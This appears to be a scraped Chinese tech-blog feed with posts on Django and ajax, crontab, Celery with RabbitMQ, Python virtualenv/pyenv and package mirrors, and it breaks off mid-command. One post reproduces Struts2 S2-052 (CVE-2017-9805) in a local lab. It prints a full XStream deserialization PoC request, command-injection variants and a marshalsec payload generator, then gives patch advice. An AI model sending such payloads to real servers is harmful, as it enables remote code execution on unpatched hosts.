可以在命令行中执行sql语句。 创建项目1django-admin startproject mysite(项目名称) 注意：目录不能带有中文。开启内置服务器：1python manage.py runserver (ip:port) #默认为8000 访问:http://localhost:8000 创建应用一个项目中可以有多个应用，一个应用即一个web应用程序。1python manage.py startapp webapp 说明：会在manage.py同级目录下创建一个webapp文件夹。 setting.py将新定义的app，这里为webapp添加到setting.py中:12345678910INSTALLED_APPS = ( 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'webapp',) 说明：添加app是为了让django知道，我们创建了一个新的app应用，让它能够加载app。 view.py定义视图函数(views.py):1234from django.http import HttpResponse def index(request): return HttpResponse("This is a test page!") 说明：视图函数(view.py)就是在服务端完成的一些列功能的函数，它接收一个request请求，返回一个response。 urls.py定义url，修改urls.py:12345678from django.conf.urls import urlfrom django.contrib import adminfrom webapp import views urlpatterns = [ url(r'^$', views.index), url(r'^admin/', admin.site.urls),] 说明：urls.py是定义django路由的文件，此路由不是网络中的路由，简单来说就是url，定义了当我们请求哪些url的时候，对应去执行view中的哪些函数。 参考文章http://code.ziqiangxuetang.com/django/django-tutorial.html 本篇只做最基础的Django介绍，至于MVC每一层具体的使用方式以及配置、安全、部署等问题，后面会逐一成文介绍]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django基础之ajax]]></title>
    <url>../../../../../../../../2017/09/14/3/</url>
    <content type="text"><![CDATA[Take control of your own desting命运掌握在自己手上 本篇主要用来记录django+ajax的一些用法以及注意点，Django使用ajax最大的一个用处，就是不用刷新整个页面的前提下，请求服务端内容来更改页面中某些元素的值。如果使用http请求，就必须重新加载一遍页面，而ajax可以只更改一部分内容。 django+ajax基础使用模版页面index.html123456789101112131415161718&lt;form&gt;&lt;input type="text" id="tn"&gt;&lt;button type="button" id="formquery"&gt;提交&lt;/button&gt;&lt;/form&gt;&lt;span id='result'&gt;&lt;/span&gt;&lt;script&gt; $(document).ready(function()&#123; $("#formquery").click(function()&#123; var toolsname = $("#tn").val(); $.get("/query/",&#123;'toolsname':toolsname&#125;, function(ret)&#123; $('#result').html(ret) #在页面中显示。可以用用$.ajax方法代替$.get &#125;) &#125;); &#125;);&lt;/script&gt; 以上代码的参数说明： $.get 表示ajax使用GET方式发送请求，也可以改成$.ajax，或者$.post表示post请求 id=”tn” 对应着js中获取的参数名称$(“#tn”) id=”formquery” 对应着按钮事件所对应的js的函数名称 id=’result’ 对应着结果返回到哪个位置$(‘#result’) 注意：这里需要注意的是button的type不能写submit，因为写了submit就直接使用get请求/query/了，而没有执行ajax请求。 view.py1234567891011121314from django.http import HttpResponsedef query(request): r=request.GET.get("toolsname") name_dict="123" return HttpResponse(json.dumps(name_dict), content_type='application/json')或者可以使用JsonResponse：from django.http import JsonResponsedef query(request): r=request.GET.get("toolsname") name_dict="123" return JsonResponse(name_dict) 说明：在视图层，即view.py中，跟正常的接受http请求的方式一样。views.py 中可以用 request.is_ajax() 方法判断是否是 ajax 请求。 关于ajax的一些高级用法等我实验完再记录……. ajax获取返回值后执行js1234567891011&lt;textarea name="content" id="content" class="form-control" rows="20"&gt;&lt;/textarea&gt;&lt;script&gt; $(document).ready(function()&#123; $("#sub_encode").click(function()&#123; var content = $("#content").val(); $.get("/add/",&#123;'content':content&#125;, function(ret)&#123; document.getElementById('content').value = ret &#125;) &#125;);&lt;/script&gt; 说明：获取返回值后，将返回值填充到textarea文本框内。 ajax+post CSRF认证在ajax代码前，加入以下js。12345&lt;script&gt;$.ajaxSetup(&#123; data: &#123;csrfmiddlewaretoken: '&#123;&#123; csrf_token &#125;&#125;' &#125;,&#125;);&lt;/script&gt; ajax+按钮加载过渡有时候网页中的某些功能需要比较长的时间等待，这时候使用ajax是比较好的，因为它不需要整个网页刷新，用户体验比较好。而按钮加载过渡的意思，就是当你点击按钮后，按钮字体内容变为“加载中”，等到ajax返回内容后再恢复，这样会使体验更好。 1234567891011121314151617&lt;button class="btn btn-primary btn-sm" type="button" id='sub_encode' data-loading-text="Loading加载中..." autocomplete="off" onclick="loag()"&gt;运行&lt;/button&gt;&lt;!-- 将按钮过渡的代码整合到ajax中 --&gt;&lt;script&gt; $(document).ready(function()&#123; $("#sub_encode").click(function()&#123; var content = $("#content").val(); var btn = $("#sub_encode"); //获取按钮对象 btn.button('loading');//按钮显示为过渡状态 $.post("&#123;% url 'run_ajax' %&#125;",&#123;'content':content,"type":"encode"&#125;, function(ret)&#123; document.getElementById('content').value = ret btn.button('reset');//按钮恢复正常 &#125;) &#125;);&lt;/script&gt;&lt;!-- 底部加载js --&gt;&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt; ajax+列表字典返回ajax返回的内容是json格式的列表或者字典时，该如何渲染到页面？如下，若后端返回的数据是json：[{“a”:”1”,”b”:”2”},{“c”:3,”d”:”4”}]1234567891011121314151617181920212223242526272829&lt;script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt;&lt;input type="text" id="tn" placeholder="请输入搜索关键词"&gt;&lt;button type="button" id="formquery" data-loading-text="努力加载中..." autocomplete="off" onclick="loag()"&gt;搜索一下&lt;/button&gt;&lt;!-- 搜索结果列表 --&gt;&lt;p id="list_result" style="word-wrap:break-word;word-break:break-all;"&gt;&lt;/p&gt; &lt;!-- ajax请求 --&gt;&lt;script&gt; $(document).ready(function()&#123; $('#formquery').click(function()&#123; var q = $("#tn").val(); var btn = $("#formquery"); //获取按钮对象 btn.button('loading');//按钮显示为过渡状态 $.getJSON('/search/',&#123;"q":q&#125;,function(ret)&#123; document.getElementById('list_result').innerText = ""; // 重置&lt;p&gt;的内容 $.each(ret, function(i,item)&#123; // 遍历列表 $.each(item, function(key,value)&#123; // 遍历字典 $('#list_result').append(key+":"+value) &#125;); &#125;); btn.button('reset'); &#125;) &#125;) &#125;);&lt;/script&gt;&lt;!-- 底部加载js --&gt;&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt; ajax配合页面自动刷新1234567891011121314151617181920&lt;input type="hidden" id="formquery" onclick="loag()"&gt; # 按钮（隐藏）&lt;div id="task_schedule_result"&gt;&lt;/div&gt; # 显示内容的地方# 点击按钮事情时，发送ajax请求js&lt;script&gt; $(document).ready(function()&#123; $('#formquery').click(function()&#123; $.getJSON("&#123;% url 'task_schedule' %&#125;",function(ret)&#123; document.getElementById('task_schedule_result').innerHTML = ret; &#125;) &#125;) &#125;);&lt;/script&gt;# 自动点击按钮js&lt;script type="text/javascript"&gt; function myrefresh()&#123; document.getElementById('formquery').click(); &#125; setInterval("myrefresh()","10000"); # 每个10秒执行一次点击按钮&lt;/script&gt; 说明：以上html代码是每隔10s利用ajax请求，获取后端数据代码。 参考http://code.ziqiangxuetang.com/django/django-ajax.html]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[struts2-052漏洞]]></title>
    <url>../../../../../../../../2017/09/06/1/</url>
    <content type="text"><![CDATA[From small beginnings comes great things伟大始于渺小 今年struts2疯了，被爆出了很多高危漏洞，之前我研究过s_045、s_046漏洞，近期又出现了s_052漏洞。s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负 s2-052漏洞介绍s2-052漏洞是当用户使用带有XStream组件的Struts-REST插件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码。 漏洞编号：CVE-2017-9805（S2-052）漏洞影响：Struts2.5 – Struts2.5.12版本。 s2-052 poc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: application/xmlContent-Length: 2365Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/editCookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7Connection: closeUpgrade-Insecure-Requests: 1&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt; &lt;dataHandler&gt; &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt; &lt;is class="javax.crypto.CipherInputStream"&gt; &lt;cipher class="javax.crypto.NullCipher"&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt; &lt;iter class="javax.imageio.spi.FilterIterator"&gt; &lt;iter class="java.util.Collections$EmptyIterator"/&gt; &lt;next class="java.lang.ProcessBuilder"&gt; &lt;command&gt; &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class="string"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt; &lt;/entry&gt;&lt;/map&gt; 注意：执行命令的地方在于command内，这里是针对mac下的弹出计算器，如果是windows可改成calc.exe12345&lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt; s2-052漏洞复现mac install tomcat在安装tomcat前，先检测一下mac上有没有安装java，可以运行java -version。123java version "1.8.0_111"Java(TM) SE Runtime Environment (build 1.8.0_111-b14)Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode) 前往tomcat官网下载：http://tomcat.apache.org/download-80.cgi?from_33lc.com 选择下载Core下的tar.gz包到本地，然后解压。将解压后到文件夹移动到/Library目录下,并命名为Tomcat；然后设置权限：1sudo chmod 755 /Library/Tomcat/bin/*.sh 进入/Library/Tomcat/bin/目录，运行启动tomcat1sudo sh startup.sh 访问：http://127.0.0.1:8080注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。 编写启动关闭tomcat脚本：将以下内容写入tomcat文件中（自己创建）1234567891011121314151617#!/bin/bashcase $1 instart)sh /Library/Tomcat/bin/startup.sh;;stop)sh /Library/Tomcat/bin/shutdown.sh;;restart)sh /Library/Tomcat/bin/shutdown.shsh /Library/Tomcat/bin/startup.sh;;*)echo “Usage: start|stop|restart”;;esacexit 0 赋予文件权限：1chmod 777 tomcat 添加环境变量：1export PATH="$PATH:/Library/Tomcat/bin" 然后运行启动关闭tomcat：12sudo tomcat startsudo tomcat stop 注：linux、windows安装tomcat方法都与之类似，这里不再演示。 下载部署存在漏洞的struts2版本从struts2的官网下载最后受影响的版本struts-2.5.12解压后，将apps目录下的struts2-rest-showcase.war文件放到webapps目录下（/Library/Tomcat/webapps）重启tomcat后访问：http://127.0.0.1:8080/struts2-rest-showcase/ 由于burpsuite监控的端口也是8080，所以我将tomcat的端口改成8081了。 构造post包可以直接使用上面的poc发包，也可以自己抓取数据包重放，自己抓取的方式是点击页面上的编辑，然后点击submit提交，抓取post包，再修改post的body字段为此漏洞的poc。 尝试不同的poc网上使用最多的poc是弹出一个计算器，然而我在mac上测试发现弹出计算器失败了，因此换了一个写文件的poc，发现测试成功。 写文件poc：（会在/tmp/下生成vuln文件）1&lt;command&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/command&gt; 弹计算器poc12345Mac:&lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;windows:&lt;command&gt;&lt;string&gt;clac.exe&lt;/string&gt;&lt;/command&gt; poc生成1java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc.exe &gt; poc.txt marshalsec-0.0.1-SNAPSHOT-all.jar网上可以下载，这里不给出地址了，自行搜索。 修补方法 升级Struts到2.5.13最新版本。 在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs python验证脚本https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0 参考文章http://www.freebuf.com/vuls/146718.htmlhttps://www.t00ls.net/thread-41942-1-1.htmlhttp://www.imooc.com/article/6453https://github.com/jas502n/St2-052/blob/master/README.md 传送门struts2-046漏洞struts2_045漏洞struts2漏洞poc汇总]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[crontab计划任务]]></title>
    <url>../../../../../../../../2017/08/31/1/</url>
    <content type="text"><![CDATA[人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光 crontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。 计划任务基本格式1* * * * * command 分 时 日 月 周 命令 第1列表示分钟1～59 每分钟用或者/1表示 第2列表示小时1～23（0表示0点） 第3列表示日期1～31 第4列表示月份1～12 第5列标识号星期0～6（0表示星期天） 第6列要运行的命令 crontab usage crontab -h 查看命令帮助 crontab -e 编辑计划任务 sudo crontab -l 列出root的计划任务 crontab -u nmask -l 列出nmask的计划任务 crontab -r 删除计划任务 一般写计划任务，都是运行crontab -e然后写入计划任务，保存退出即可。 每秒执行1* * * * * sleep 10; 每10s运行一次。 crontab文件的一些例子123456789101112131415161730 21 * * * /usr/local/etc/rc.d/lighttpd restart 表示每晚的21:30重启apache45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart 表示每月1、10、22日的4:4510 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart 表示每周六、日的1:10重启apache0,30 18-23 * * * /usr/local/etc/rc.d/lighttpd restart 表示在每天18:00至23:00之间每隔30分钟重启apache。 0 23 * * 6 /usr/local/etc/rc.d/lighttpd restart 表示每星期六的11:00pm重启apache。 0 */1 * * * /usr/local/etc/rc.d/lighttpd restart 每一小时重启apache 0 23-7/1 * * * /usr/local/etc/rc.d/lighttpd restart 晚上11点到早上7点之间，每隔一小时重启apache 0 11 4 * mon-wed /usr/local/etc/rc.d/lighttpd restart 每月的4号与每周一到周三的11点重启apache0 4 1 jan * /usr/local/etc/rc.d/lighttpd restart 一月一号的4点重启apache 坑点12*/1 * * * * 每分钟执行1 * * * * 每小时执行一次 注意上面2条计划任务，一个是每分钟执行，一个是每小时执行。 测试环境如果不确定写的计划任务是否正确，可以在线测试：http://tool.lu/crontab/]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[celery分布式消息队列]]></title>
    <url>../../../../../../../../2017/08/25/1/</url>
    <content type="text"><![CDATA[Quitters never win and winners never quit退缩者永无胜利，胜利者永不退缩。 之前在分布式消息队列上我一直使用rabbitmq+pika组合，然而由于对rabbitmq与pika理解不深，因此使用过程中遇到了很多坑。直到最近我决定重新研究下分布式消息队列，当然这次抛弃了pika，而选用celery。 回想之前我对pika与celery有过一些疑问，两者有何区别？又有何相同点？经过几天的研究，目前总算是清晰了一点，因此在此对celery+rabbitmq做个记录。 安装celery1pip install celery 说明：celery只支持python2.7及以上版本，建议在虚拟环境中安装，如何构造虚拟环境可参考：python虚拟环境 Celery是如何工作的？我在此模拟几个角色来解释下celery+rabbitmq是如何工作的，脑洞来自网络，这里借鉴扩展一番。 假设目前D公司要开半年度工作会议，会议上要指定下半年工作计划，参会人员有老板（下发任务者）、部门主管（celery分配任务者）、部门员工（工作者）、老板秘书（沟通协调者，rabbitmq）。 工作内容是什么？ 那么这场会议首先需要确定的是下半年的具体工作内容，这里就称之为“任务内容”。比如老板说我们下半年要开发出一个大数据平台，部门主管举手称赞，表示赞同，于是便愉快地定下了我们具体的工作任务（task），当然开发一个平台算是这个项目的总任务，其中可以细分成很多小的任务，比如大数据算法怎么写？界面怎么设计等。 工作者在哪里？ 在确定了具体工作任务后，老板便把这个项目交给了部门主管（celery），而部门主管此时要确定谁去完成这项任务，它可以指定某个人（worker），也可以多个人。 发布工作者在哪里？ 毫无疑问发布工作任务的人是老板（下发任务者），他指定了部门主管（celery）什么时候去完成哪些任务，并要求获取反馈信息。但有一点需要注意，老板只管布置任务，但不参与具体的任务分配，那这个任务分配的功能交给谁，没错就是部门主管，即celery。 老板与员工如何沟通项目？ 项目之初，老板通过电话将任务传递给部门主管，部门主管通过部门会议将任务分配给员工，过段时间再将任务结果反馈给老板。然而随着任务越来越多，部门主管就发现了一个问题，任务太多了，每个任务还要反馈结果，记不住，也容易弄乱，导致效率下降。 在召开会议商量了一番后，老板秘书站起来说：“我有个提议，老板每天将布置的任务写成一张纸条放到我这，然后部门主管每天早上来取并交给员工，至于纸条上的任务如何分配，部门主管决定就行，但是要将结果同样写一张纸条反馈给我，我再交给老板。这样老板只负责下发任务，我只负责保管任务纸条，部门主管只负责分配任务并获取反馈，员工只负责按任务工作。大家职责都很明确，效率肯定会更高。”至此，老板与员工的沟通问题也解决了。 演示代码celery_con.py1234from celery import Celeryimport timeapp = Celery(backend='amqp', broker='amqp://guest:guest@127.0.0.1:5672') 说明：celery_con.py的作用是连接rabbitmq，注意这里是利用celery连接的rabbitmq。映射到场景中，就是秘书与主管，秘书与老板之间传递信息的通道。 task.py（任务内容）123456789101112from celery_con import app@app.taskdef test(x, y): time.sleep(5) return x + y@app.taskdef scan(x,y): time.sleep(1) return x-y 说明：task.py的功能是定制具体的任务，即“任务内容”，映射到场景中便是“开发一个大数据平台”，其中算法要怎么写？界面要如何设计等等。 celery（部门主管）1celery -A task worker -c 2 说明：此命令为开启work，分配任务；task就是task.py脚本的名称，表示work为task任务服务；-c 2表示同时开启2个work。映射到场景中，便是部门主管实时向秘书获取纸条，并分配给员工。 run.py（老板）1234from task import test,scanres=test.delay(2,2)print res.get() 说明：run.py的作用是下发消息到rabbitmq队列中，映射到场景中即老板将任务写在纸条上交给秘书。 运行：1python run.py 而这里的秘书指的就是rabbitmq。 celery与pika的区别 简单来说，pika其实就是用来连接rabbitmq服务的一个python客户端模块，而rabbitmq本身只有消息存储功能，并没有任务的分配调度。当然在用pika连接rabbitmq的过程也可以任务分配，这需要利用pika模块自己写一个调度代码，也就是相当于自己写一个celery模块。 celery就是用来分配任务的，主要是做异步任务队列的，但是celery不具备存储的功能，因此需要一种介质去存储消息，所以常常与rabbitmq一起用。 celery高级用法12345from task import scanr=scan.s(2,2)res=r.delay()print res.get() 并发下发任务并发的下发任务，也可以使用for循环。这里指的并发，并不是所有任务一起执行，而是所有任务都下发到队列，而执行的并发数量，取决于work的数量。1234from celery import groupfrom task import scang=group( scan.s(i,i) for i in range(10)).delay()print g.get() 指定下发的队列有时候我们会遇到多个任务，而每个任务的执行对象不一样，因此需要创建不同的队列去存储任务，这时就需要我们在创建任务、消费任务时指定队列的名称。 配置celerycelery_con.py1234567891011121314151617181920212223242526272829303132from celery import Celery,platformsRABBITMQ_IP="127.0.0.1"RABBITMQ_PORT="5672"RABBITMQ_USER=""RABBITMQ_PASS=""app = Celery( backend='amqp', broker='amqp://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;'.format( RABBITMQ_USER, RABBITMQ_PASS, RABBITMQ_IP, RABBITMQ_PORT, ), CELERY_ROUTES = &#123; 'worker.test1': &#123;'queue': 'test1'&#125;, 'worker.test2': &#123;'queue': 'test2'&#125;, 'worker.test3': &#123;'queue': 'test3'&#125;, &#125;, )# 允许celery以root权限启动platforms.C_FORCE_ROOT = Trueapp.conf.update(CELERY_TASK_SERIALIZER='json',CELERY_RESULT_SERIALIZER='json',CELERY_IGNORE_RESULT = True,CELERYD_PREFETCH_MULTIPLIER = 10,CELERYD_MAX_TASKS_PER_CHILD = 200,) 指定任务内容task.py123456789from celery_con import app@app.taskdef test(x, y): time.sleep(5) return x + y@app.taskdef scan(x,y): time.sleep(1) return x-y 下发任务push_task.py1234from celery import groupfrom task import scang=group( scan.s(i,i) for i in range(10)).apply_async(queue='test1')print g.get() 说明：下发任务时，将会把任务存入rabbitmq的test1队列中。 启动work处理任务celery_start_work.sh1celery -A task worker --queue=test1 说明：worker工作者将会从rabbitmq的test1队列中获取数据。 celery+rabbitmq优化忽略结果我查看rabbitmqweb页面，发现celery每执行一个任务都会产生一个队列，这个队列存放的是这个任务执行的状态，而且这个队列很占内存，只有当客户端执行获取的操作，队列才会消失。1@app.task(ignore_result=True) #忽略结果，这样就不会产生queue了 celery定时任务（计划任务）一般情况下，我们会使用linux系统自带的crontab做计划任务，然而在celery中可以用自身的定时任务功能创建计划任务。 创建celery_con.py12345678910111213141516171819202122232425262728293031from celery import Celeryfrom celery.schedules import crontab # 计划任务模块RABBITMQ_IP=""RABBITMQ_PORT=""RABBITMQ_USER=""RABBITMQ_PASS=""app = Celery( backend='amqp', broker='amqp://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;'.format( RABBITMQ_USER, RABBITMQ_PASS, RABBITMQ_IP, RABBITMQ_PORT, ), )app.conf.update(# 定时任务beat_schedule=&#123; # 定时任务1 "crontab_1": &#123; "task": "celery_work.run", # 执行的任务，即celery_work文件的run函数 "schedule": crontab(minute='*/1'), # 每分钟执行一次 "args": ("celery_crontab_test",) # 执行任务传入的参数 &#125;, # 定时任务2 # ...... &#125;) 说明：关键点在于在app.conf.update里面设置beat_schedule（计划任务），task表示要执行的任务名称，schedule代表计划任务的执行周期，args代表执行任务时所需要传入的参数。schedule具体配置可参考：http://docs.celeryproject.org/en/latest/reference/celery.schedules.html#celery.schedules.crontab 创建celery_work.py12345from celery_con import app@app.taskdef run(msg): print msg 说明：导入celery的配置，利用装饰器给run函数设置为celery任务。 执行celery定时任务1celery -A celery_work worker -B 说明：-A代表执行的任务名称(与work文件名称一样)，-B表示执行周期任务，只能有一个进程，不能启动多个。 执行结果是，每隔一分钟，输出：celery_crontab_test celery+rabbitmq 优先级任务rabbitmq在3.5版本开始支持队列优先级，注意一定要将rabbitmq版本升级为3.5以后的，不然用不了优先级。需要说明一下，这里的优先级有两种，第一种是同一个队列，队列中不同的消息可以设置优先级；第二种是不同队列之间设置优先级。 同一个队列不同消息优先级对应需求：在work执行常规任务的时候，需要让work执行一些应急任务（突发），因此将一些突发任务push到同一个队列中，但要排在队列首位（优先级高），即先让work执行应急任务。 先在web界面创建一个优先级队列可以看到hello队列有Pri标志，表示是一个优先级队列。 创建celery配置文件：(config.py)文件写入：123456789101112131415161718192021222324252627282930from celery import Celeryfrom kombu import Exchange, QueueRABBITMQ_IP=""RABBITMQ_PORT=""RABBITMQ_USER=""RABBITMQ_PASS=""app = Celery( backend='amqp', broker='amqp://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;'.format( RABBITMQ_USER, RABBITMQ_PASS, RABBITMQ_IP, RABBITMQ_PORT, ),)# 相关配置写在这里app.conf.update( CELERY_ACKS_LATE = True, CELERYD_PREFETCH_MULTIPLIER = 1, CELERYD_MAX_TASKS_PER_CHILD = 500, CELERY_ENABLE_REMOTE_CONTROL = False, CELERYD_TASK_TIME_LIMIT = 60, CELERY_DEFAULT_QUEUE = 'hello', CELERY_QUEUES = ( Queue('hello', Exchange('hello'), routing_key='hello',queue_arguments=&#123;'x-max-priority': 10&#125;), # 队列名称为hello ),) 创建一个简单的测试task：(task.py)文件写入：1234567import timefrom config import app@app.task(ignore_result=True)def run(task): print task time.sleep(1) 创建一个push任务的py：(push_task.py)文件写入：12345678910from celery import groupfrom task import rungroup( run.s("111111111",) for i in range(10)).apply_async(queue='hello',priority=1) # priority=1 用来设置消息优先级group( run.s("999999999",) for i in range(10)).apply_async(queue='hello',priority=9) # priority=1 用来设置消息优先级# 或者也可以用下面的方式push任务：# for i in range(10):# run.apply_async(args=['111'],queue="hello",priority=1)# run.apply_async(args=['999'],queue="hello",priority=9) 利用celery创建worker1celery -A task worker -Q hello 说明：从结果可以看出，worker优先执行了优先级为9的消息。 不同队列之间的优先级对应需求：worker将会获取多个队列中的任务并执行，但对某些队列的执行优先级高，某些队列执行的优先级低。 暂没有找到实现方案，网上的方案测试都不成功！ 以上内容是个人理解的celery用法以及一些原理，如有谬误，欢迎指正，谢谢！]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>celery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python虚拟环境]]></title>
    <url>../../../../../../../../2017/08/24/2/</url>
    <content type="text"><![CDATA[总有一条蜿蜒在童话镇里七彩的河 有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。 virtualenvvirtualenv是跨平台的，linux、mac、windows都可以使用。 install1pip install virtualenv 创建虚拟目录1virtualenv kvenv -p /usr/bin/python2 说明：创建完成后会生成一个kvenv目录，可以加上-p参数指定Python版本。（当然要系统安装了某版本的python才能创建这个版本的虚拟目录） 激活虚拟环境1source kvenv/bin/activate 退出虚拟环境1deactivate 查看python路径1which python # 看python路径是否为新创建的虚拟目录 说明：Mac、linux与windows上安装使用方法一样。 pyenvpyenv严格来说是python的版本控制器，使用很灵活。 Install12$ brew update$ brew install peen 配置环境变量12$ echo 'eval "$(pyenv init -)"' &gt;&gt; ~/.bash_profilesource ~/.bash_profile Usage pyenv version # 当前版本 pyenv versions # 所有版本 pyenv global system # 全局切换 pyenv local 2.7.10 # 本地切换 pyenv local 3.5.0 –unset # 取消切换 pyenv常用命令1234567$ pyenv install --list #列出可安装版本$ pyenv install &lt;version&gt; # 安装对应版本$ pyenv versions # 显示当前使用的python版本$ pyenv which python # 显示当前python安装路径$ pyenv global &lt;version&gt; # 设置默认Python版本$ pyenv local &lt;version&gt; # 当前路径创建一个.python-version, 以后进入这个目录自动切换为该版本$ pyenv shell &lt;version&gt; # 当前shell的session中启用某版本，优先级高于global 及 local 安装其他版本python12pyenv install xx.xx.xx (pyenv install 3.4.3) #安装python3.4.3pyenv rehash # 安装完以后记得一定要rehash virtualenv or pyenv ?如果是项目环境，建议virtualenv，环境独立，也不会有很大的Bug。如果只是个人学习练习python，可以使用pyenv，切换方便。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Brew、Pip、Yum更换国内源]]></title>
    <url>../../../../../../../../2017/08/24/1/</url>
    <content type="text"><![CDATA[翻过人山人海 brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。yum是centos操作系统的包管理工具，默认的源也是国外的，速度比较慢。 brewbrew是mac上的包管理工具，类似于ubuntu上的apt-get，centos上的yum。 安装brew1ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" 使用brew1brew install 更换源brew默认的源速度太慢了，有时还会被墙……，可以替换成国内的源，这里演示的是中科大的源。 替换brew.git12cd "$(brew --repo)"git remote set-url origin https://mirrors.ustc.edu.cn/brew.git 替换homebrew-core.git12cd "$(brew --repo)/Library/Taps/homebrew/homebrew-core"git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git 替换Homebrew Bottles源对于bash用户：12echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' &gt;&gt; ~/.bash_profilesource ~/.bash_profile 对于zsh用户：12echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' &gt;&gt; ~/.zshrcsource ~/.zshrc 说明：建议以上三个源都替换一下，然后brew update 更新一下。 pippip是python的包管理工具，类似node.js的npm管理工具。 Install1sudo apt-get install python-pip 或者：123wget 